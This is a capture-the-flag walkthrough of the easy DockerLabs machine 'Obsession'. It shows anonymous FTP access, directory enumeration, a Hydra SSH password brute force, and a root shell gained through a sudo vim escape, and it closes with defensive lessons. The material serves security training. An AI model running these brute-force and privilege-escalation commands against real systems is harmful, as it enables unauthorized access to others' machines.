# Obsession - DockerLabs - Easy

## Summary
Obsession is an easy Linux Docker container exposing FTP, SSH, and a web server.
Anonymous FTP access reveals two text files leaking the username `russoski` and
hinting at unsafe system configurations. Web enumeration uncovers hidden
directories (`/backup/` and `/important/`) containing a root password file.
After brute-forcing russoski's SSH password with Hydra, a misconfigured sudo
rule allows running `vim` as root without a password, leading to immediate
privilege escalation via a shell escape.

## Tools
- `nmap`
- `ftp`
- `gobuster`
- `hydra`
- `ssh`
- `vim` (privesc)

## 1. Enumeration

### Port Scanning

```sh
nmap -sC -sV -p- 172.17.0.2
```

```
21/tcp open ftp     vsftpd 3.0.5  ← Anonymous login allowed
22/tcp open ssh     OpenSSH 9.6p1
80/tcp open http    Apache httpd 2.4.58
```

### FTP — Anonymous Access

```sh
ftp 172.17.0.2
# Name: anonymous
# Password: (empty)
```

```sh
ftp> get chat-gonza.txt
ftp> get pendientes.txt
ftp> exit
```

**`pendientes.txt`** reveals the machine owner is aware of unsafe permissions
on his system — a clear hint toward misconfigured sudo or SUID:

```
4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros..
```

**`chat-gonza.txt`** leaks the username **russoski** through a casual
conversation, and hints at a sensitive file stored on the system.

### Web Enumeration

```sh
gobuster dir -u http://172.17.0.2 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 50
```

```
/backup/    (Status: 301)
/important/ (Status: 301)
```

Browsing to these directories reveals:

```
http://172.17.0.2/backup/          → .formrellyrespexit.html
http://172.17.0.2/important/       → .root-passwd.txt
```

> **Note:** The history of russoski's session confirms these paths:
> `cat .root-passwd.txt` — the root password was stored here in plaintext.

## 2. Exploitation

### Brute-Forcing SSH (Hydra)

Using the username leaked via FTP:

```sh
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -I
```

```
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

### SSH Access as Russoski

```sh
ssh-keygen -f '/home/mapacheroja/.ssh/known_hosts' -R '172.17.0.2'
ssh russoski@172.17.0.2
# password: iloveme
```

## 3. Privilege Escalation

### Exploitation (GTFOBins — vim)

`vim` can escape to a shell using the `-c` flag to run an Ex command:

```sh
sudo /usr/bin/vim -c ':!/bin/bash'
```

```sh
whoami
# root
```

### Root Flag

```sh
cat /root/Video-Nagore-Fernandez.txt
# Al fin lo terminé! es tan hermosa.. <3
# https://www.youtube.com/shorts/_v8GzGReTAk
```

## 4. Lessons Learned

- **Anonymous FTP should never be enabled on production systems** — it exposed
  usernames and internal notes directly.
- **Sensitive files in web directories are dangerous** — `/important/.root-passwd.txt`
  is a critical misconfiguration; never store credentials in web-accessible paths.
- **Casual chat logs leak OSINT** — the FTP file revealed the username `russoski`
  and hinted at a sensitive file on the system.
- **Bash history is a goldmine** — `history` revealed the exact paths
  (`/var/www/html/backup/`, `/var/www/html/important/`) used during setup.
- **`sudo NOPASSWD` on text editors** (vim, nano, less) is an immediate root
  escalation — shell escapes are trivial and well-documented on GTFOBins.
